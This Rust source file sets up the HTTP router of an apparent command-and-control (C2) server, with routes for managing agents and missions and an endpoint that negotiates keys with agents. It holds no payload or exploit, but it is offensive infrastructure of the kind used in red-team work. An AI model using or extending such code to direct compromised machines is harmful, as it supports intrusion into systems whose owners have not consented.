use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post, put},
    Json, Router,
};
use common::model;
use tracing::{error, warn};

use crate::{services, C2State};

mod agents;
mod missions;

pub const AGENT_NOT_FOUND: &str = "Agent not found.";
pub const MISSION_NOT_FOUND: &str = "Mission not found.";

// TODO Try to propagate errors using impl IntoResponse for better error handling

// TODO Fix access & permissions, encrypt all routes or listen on a different interface for admin routes or something else
pub fn init_router() -> Router<C2State> {
    Router::new()
        .route("/crypto/:mission_id", get(get_crypto))
        .nest(
            "/agents",
            Router::new()
                .route("/", /*post(agents::create).*/ get(agents::get))
                .nest(
                    "/:agent_id",
                    Router::new().route("/", put(agents::update).delete(agents::delete)),
                ),
        )
        .nest(
            "/missions",
            Router::new()
                .route("/", post(missions::create).get(missions::get_next))
                .route(
                    "/:mission_id",
                    get(missions::get_report).put(missions::report),
                ),
        )
}

// TODO When agent is updating, it gets another identity key pair.
// Check whether it is good to update the agent's identity key pair here.
async fn get_crypto(
    State(mut c2_state): State<C2State>,
    Path(mission_id): Path<i32>,
    crypto_negociation: Json<model::CryptoNegociation>,
) -> impl IntoResponse {
    if let Err(e) = crypto_negociation.verify() {
        error!("{e}");
        return (StatusCode::UNAUTHORIZED).into_response();
    }

    let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
        Ok(Some(m)) => m,
        Ok(None) => {
            warn!("Mission not found");
            return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
    };

    if mission.completed_at.is_some() {
        warn!("Mission [{}] is already completed", mission_id);
        return (StatusCode::BAD_REQUEST).into_response();
    }

    let agent = match services::agents::get_by_id(c2_state.conn.clone(), mission.agent_id) {
        Ok(Some(agent)) => agent,
        Ok(None) => {
            warn!("Agent not found");
            return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
    };

    if let model::Task::Update(release) = mission.task {
        if release.verifying_key == crypto_negociation.identity {
            if let Err(e) = services::agents::update_by_id(
                c2_state.conn.clone(),
                &model::Agent {
                    identity: release.verifying_key,
                    ..agent
                },
            ) {
                error!("{e}");
                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
            }
        }
    }

    let (private_key, crypto_negociation) =
        model::CryptoNegociation::new(&mut c2_state.signing_key);
    c2_state
        .ephemeral_private_keys
        .lock()
        .unwrap()
        .entry(mission.id)
        .or_insert(private_key);

    (StatusCode::OK, Json(Some(crypto_negociation))).into_response()
}
